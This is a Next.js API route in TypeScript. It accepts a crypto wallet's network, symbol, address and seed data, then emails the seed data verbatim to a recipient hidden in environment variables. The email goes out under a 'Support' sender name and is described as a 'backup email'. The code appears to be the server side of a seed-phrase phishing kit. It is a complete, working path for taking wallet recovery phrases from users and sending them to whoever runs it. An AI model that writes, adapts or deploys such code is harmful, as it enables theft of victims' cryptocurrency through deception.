import { NextRequest, NextResponse } from 'next/server'
import { Resend } from 'resend'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { network, symbol, walletAddress, seedData, timestamp } = body

    console.log('Email submit request received:', { network, symbol, walletAddress, hasSeedData: !!seedData })

    // Validate required fields
    if (!network || !symbol || !walletAddress || !seedData) {
      console.error('Missing required fields:', { network, symbol, walletAddress, hasSeedData: !!seedData })
      return NextResponse.json(
        { error: 'Missing required fields in the reuest headers', details: { network: !!network, symbol: !!symbol, walletAddress: !!walletAddress, seedData: !!seedData } },
        { status: 400 }
      )
    }

    // Check environment variables
    const resendApiKey = process.env.RESEND_API_KEY
    const recipient = process.env.EMAIL_RECIPIENT

    console.log('Environment check:', { 
      hasApiKey: !!resendApiKey, 
      hasRecipient: !!recipient
    })

    if (!resendApiKey) {
      console.error('RESEND_API_KEY is not configured')
      return NextResponse.json(
        { error: 'Email service not configured: RESEND_API_KEY missing' },
        { status: 500 }
      )
    }

    if (!recipient) {
      console.error('EMAIL_RECIPIENT is not configured')
      return NextResponse.json(
        { error: 'Email service not configured: EMAIL_RECIPIENT missing' },
        { status: 500 }
      )
    }

    // Initialize Resend
    const resend = new Resend(resendApiKey)

    // Send email using Resend with domain
    console.log('Attempting to send email via Resend...')
    const { data, error } = await resend.emails.send({
      from: `Support ${process.env.AUTH_EMAIL_USER}`,
      to: [recipient],
      subject: network,
      html: `<pre style="font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all;">${seedData}</pre>`,
    })

    if (error) {
      console.error('Resend API error:', error)
      return NextResponse.json(
        { 
          error: 'Failed to send email via Resend', 
          details: error.message || 'Unknown Resend error'
        },
        { status: 500 }
      )
    }

    console.log('Resend email sent successfully:', data)

    return NextResponse.json(
      { success: true, message: 'Email sent successfully', data: data },
      { status: 200 }
    )

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  } catch (error: any) {
    console.error('Email sending error:', error)
    console.error('Error details:', {
      message: error?.message,
      name: error?.name,
      stack: error?.stack
    })
    
    return NextResponse.json(
      { 
        error: 'Failed to send backup email', 
        details: error?.message || 'Unknown error',
        type: error?.name || 'Error'
      },
      { status: 500 }
    )
  }
}
